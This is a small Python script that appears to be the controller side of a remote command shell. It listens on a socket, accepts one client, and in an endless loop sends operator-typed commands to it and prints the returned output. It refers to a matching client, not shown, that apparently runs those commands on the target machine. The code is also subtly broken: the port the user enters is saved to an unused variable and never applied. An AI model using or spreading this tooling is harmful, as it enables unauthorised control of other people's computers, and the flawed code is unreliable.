# Imports
import socket

# Getting our local IP and a specified port
HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222
FORMAT = 'utf-8'

if HOST == '127.0.0.1':
    print(f"[!] Don't forget to change default HOST:{HOST} to your HOST:{socket.gethostbyname(socket.gethostname())} in both server and client")

new_port = input('Input Host Port (Blank if default).')
if (new_port != "\n"):
    REMOTE_PORT = new_port

# Binding the IP to the Port
# Creating a Socket
server = socket.socket()
server.bind((HOST, PORT))

# Starting the Listener
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

# Sending and receiving commands in an infinite loop
while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
